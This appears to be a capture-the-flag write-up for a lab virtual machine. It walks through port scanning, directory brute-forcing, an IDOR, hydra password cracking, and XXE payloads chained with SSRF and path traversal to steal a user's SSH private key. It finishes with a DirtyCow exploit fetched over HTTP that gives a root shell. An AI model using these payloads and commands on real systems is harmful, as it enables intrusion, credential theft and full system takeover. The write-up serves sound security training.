# Recon

`nmap -p- 192.168.56.21` gives us 4 ports open

```
Nmap scan report for 192.168.56.21
Host is up (0.00031s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
10022/tcp open  unknown
11022/tcp open  unknown
MAC Address: 08:00:27:6F:06:91 (Oracle VirtualBox virtual NIC)
```

Then we execute `nmap -p 22,80,10022,11022 -sVC 192.168.56.21`

We get
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 d1:4e:b3:f5:c0:c5:17:50:f0:c6:0e:f2:7a:5c:77:1c (DSA)
|   2048 4a:8b:6d:29:46:14:28:70:6c:a9:6c:4b:8a:9b:8c:2b (RSA)
|   256 a9:79:79:40:df:42:7e:a9:21:26:05:fc:14:95:4e:c4 (ECDSA)
|_  256 22:23:00:84:1a:66:b7:a5:92:c6:3d:76:32:cf:a3:35 (ED25519)                                                                                                                                                                          
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))                                                                                                                                                                                     
|_http-title: Leaking forum                                                                                                                                                                                                                
|_http-server-header: Apache/2.4.10 (Debian)                                                                                                                                                                                               
| http-cookie-flags:                                                                                                                                                                                                                       
|   /:                                                                                                                                                                                                                                     
|     PHPSESSID:                                                                                                                                                                                                                           
|_      httponly flag not set                                                                                                                                                                                                              
10022/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)                                                                                                                                                                       
| ssh-hostkey:                                                                                                                                                                                                                             
|   1024 39:54:8f:55:e9:4f:20:0e:c5:10:41:57:47:2a:51:0e (DSA)                                                                                                                                                                             
|   2048 3f:5b:3c:ae:f4:6a:aa:06:9f:40:ad:d4:37:f4:7c:ac (RSA)                                                                                                                                                                             
|   256 50:dd:a9:33:fb:91:42:0e:ab:c7:b8:e5:e6:f3:18:93 (ECDSA)                                                                                                                                                                            
|_  256 82:a2:08:21:14:38:48:52:ef:58:77:0e:9d:32:f8:11 (ED25519)
11022/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 9e:b2:84:62:65:9b:00:82:04:eb:bb:25:b9:20:05:86 (DSA)
|   2048 ab:e8:97:97:7c:1f:f2:8f:a6:3a:65:f5:8e:87:17:eb (RSA)
|   256 1a:4f:9c:8c:79:b2:39:88:03:51:c8:5d:75:a8:77:21 (ECDSA)
|_  256 ba:50:4a:20:91:ab:ba:9d:54:30:96:f6:2d:39:a7:da (ED25519)
MAC Address: 08:00:27:6F:06:91 (Oracle VirtualBox virtual NIC)
```

The random ssh ports are weird, but let's start with the http service.

The service is apache php so let's scan it

`gobuster dir -u http://192.168.56.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`

We get

```
===============================================================
[+] Url:                     http://192.168.56.21/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1301]
/profile.php          (Status: 302) [Size: 1639] [--> index.php]
/assets               (Status: 301) [Size: 315] [--> http://192.168.56.21/assets/]
/.php                 (Status: 403) [Size: 292]
/index.php            (Status: 200) [Size: 6011]
/css                  (Status: 301) [Size: 312] [--> http://192.168.56.21/css/]
/includes             (Status: 301) [Size: 317] [--> http://192.168.56.21/includes/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.56.21/js/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/databases.php        (Status: 200) [Size: 2393]
/employees.php        (Status: 200) [Size: 5005]
/.php                 (Status: 403) [Size: 292]
/server-status        (Status: 403) [Size: 301]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================
```

# IDOR

The employees.php page is interesting, the employee ids are sequential so we can iterate using the intruder page in burpsuite (number scan).
It takes a lot of time to scan so trust me it doesn't go above id 42.
We gather all the email from that (use the auto-scroll when text changes).

```
carlos@wingcorp.com
marchal@wingcorp.com
robin@wingcorp.com
lily@wingcorp.com
barney@wingcorp.com
ted@wingcorp.com
```

Then we use hydra: `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.21 -s 80 http-post-form "/login.php:email=^USER^&password=^PASS^:F=Invalid Credentials."`

Carlos (the sysadmin) has a weak password (still took a loong time lol)
His pass is `sunshine1` and user `carlos@wingcorp.com`

# XXE

There is a vuln on the update profile form that alows us to print arbitrary file contents

```
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<profile>
<username>
	&test;
</username><email>b</email><password>c</password></profile>
```

We then use that to print the file at `/etc/hosts`

We get (among boring stuff)
```
10.0.0.110  frontend
10.0.0.120  backend
```

We can also use the php wrapper to extract php files

```
<!--?xml version="1.0" ?-->
<!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]>
<profile>
<username>
	&test;
</username><email>b</email><password>c</password></profile>
```

This gives us php data as base64. We extract and base64 -d it to reconstruct the code in local. We can use `grep -ri 'requi'` to look for imports of other files.

The includes/leaks.php file is interesting, it handles api calls to the backend to retrieve files.

```
<?php


if(isset($_POST['endpoint']) and !empty($_POST['endpoint']))
{
        $endpoint = $_POST['endpoint'];
}
else
{
        $endpoint = "?db=leaks.txt";
}

$url = 'http://backend/' . $endpoint;

$options = array(
    'http' => array(
        'method'  => 'GET'
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

echo $result;
?>
```

We should be able to exploit the http wrapper to do a file read on the backend THROUGH the XXE on the frontend

```
<!--?xml version="1.0" ?-->
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://backend/?db=leaks.txt'>]>
<profile>
<username>
	&test;
</username><email>b</email><password>c</password></profile>
```

We can read the intended file on the backend, but using an unorthodox manner.

Now let's use that to exploit a path traversal :

```
<!--?xml version="1.0" ?-->
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://backend/?db=../../../../etc/passwd'>]>
<profile>
<username>
	&test;
</username><email>b</email><password>c</password></profile>
```

We get the content of /etc/passwd but on the backend server that's huge !

There is carlos' user in there :

```
carlos:x:1000:1000::/home/carlos:/bin/bash
```

What if, for some reason, carlos has a ssh key in his home dir ?

```
<!--?xml version="1.0" ?-->
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://backend/?db=../../../../home/carlos/.ssh/id_rsa'>]>
<profile>
<username>
	&test;
</username><email>b</email><password>c</password></profile>
```

Well he has so we can just impersonate him and ssh in the server

(don't forget to chmod 600 the file or ssh complains)

`ssh carlos@192.168.56.21 -p 11022 -i .ssh/id_carlos`

And we just cat the flag

# Escalation

`uname -a` tells us that the kernel is OLD so it might be vulnerable to DirtyCow

On our machine :
```
git clone https://github.com/scumjr/dirtycow-vdso.git
python -m http.server 80
```

Then on the remote
```
wget -r http://192.168.56.3/dirtycow-vdso/
cd 192.168.56.3/dirtycow-vdso
make
```

Then we get the container ip with `ip a` which is 10.0.0.120 here

Then `./0xdeadbeef 10.0.0.120:8080`

Don't wait for the program to end, type `id` to check if it is all good then stabilize the shell :

Execute `/usr/bin/script -qc /bin/bash /dev/null` in the revshell                                                                                                                                                                       
Then Ctlr-Z, then `stty raw -echo && fg` then Enter Enter

And now we are root on the host when we were unprivileged in a container before !
